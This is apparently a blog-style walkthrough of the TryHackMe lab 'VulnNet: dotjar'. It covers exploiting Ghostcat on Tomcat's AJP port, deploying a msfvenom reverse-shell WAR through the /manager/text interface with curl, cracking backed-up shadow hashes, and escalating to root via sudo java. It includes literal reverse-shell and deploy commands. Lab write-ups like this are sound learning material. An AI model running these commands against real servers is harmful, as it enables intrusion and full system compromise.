# VulnNet: dotjar

https://tryhackme.com/room/vulnnetdotjar

Oof, this room took a lot longer than it should have, I think. I really struggled with the initial foothold (not helped by the room saying it should have been easy, haha).

Recon showed two ports, `8009` and `8080`. On `8080` was a tomcat instance, so I immediately though of the war deploy hack, but the manager interface was protected by basic auth. I ran through a bunch of default creds for this, tried hitting it with hydra and even metasploit's enum function (I usually avoid metasploit just because its too magic), but no dice.

`8009` is the 'ajp' port, sort of a different protocol way to access the admin interface. A few resources I'd read only mentioned it insofar as you can use it to access tomcat if `8080` is blocked, which wasn't much use. Hmm. I figured it being exposed though, as one of only *two* ports, must be important.

An hour or so of banging my head, and I did a bit more research before stumbling onto [Ghostcat](https://www.securityweek.com/apache-tomcat-affected-serious-ghostcat-vulnerability) - a vulnerability in ajp that provides somewhat restricted but still potentially devastating local file inclusion. To test this, I hit up exploit db and found this python 2 script: https://www.exploit-db.com/exploits/48143

Grabbing this and running it as is (`python2 ghostcat.py 10.10.104.169`) pulled out the `WEB-INF/web.xml` file, which contained the following text:

Great! I had creds... but these didn't work for the manager interface. They did work for the host-manager though, and thus went the next hour as I went down a dead end. Specifically, I tried following this guide: https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/, but couldn't get it to work. Turns out, it only works if a number of configurations have been made to, for example, allow tomcat to host from remote servers which didn't appear to be the case.

So I was stuck again... until I read the above more slowly. The GUI is disabled... but in my wanderings and enumeration of tomcats docs I found it had a ... text interface? basically a simplistic api. That is, `/manager/html` is the standard manager url, but */manager/text* performs basically the same purpose *without a gui*! Sure enough, by accessing `/manager/text/list` I got a list of deployed applications.

Ok, so back to using the standard war exploit, finally :)

- First I created a jsp-based reverse shell with msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.108.144 LPORT=4444 -f raw -o revshell.jar`
- Then I uploaded this using curl: `curl -u <redacted> --upload-file revshell.war http://10.10.104.169:8080/manager/text/deploy?path=/revshell`
- Finally, by starting a nc listener and navigating to `http://10.10.104.169:8080/revshell`, I got onto the machine as 'web'.

From here it was somewhat easy. I ran linpeas, and found a backup file under backups I could read, `shadow-backup-alt.gz`. Unzipping this got me a copy of shadow with the hashes for `web` and the other user, `jdk-admin`. I put these through hashcat with rockyou and `-m 1800` and quickly got the jdk-admin password. In their home directory was the user flag.

To get to root, sudo -l revealed I could run java as root, specifically `/usr/bin/java -jar *.jar`. Easy. I created another revshell, with a subtly different payload: `msfvenom -p java/shell_reverse_tcp LHOST=10.10.108.144 LPORT=4445 -f raw -o revshell2.jar`, brought this onto the machine via a web server and wget, started a new listener and then ran the sudo command to get a root shell. Boom :) As a note, msfvenom with a java payload will emit a jar format by default.
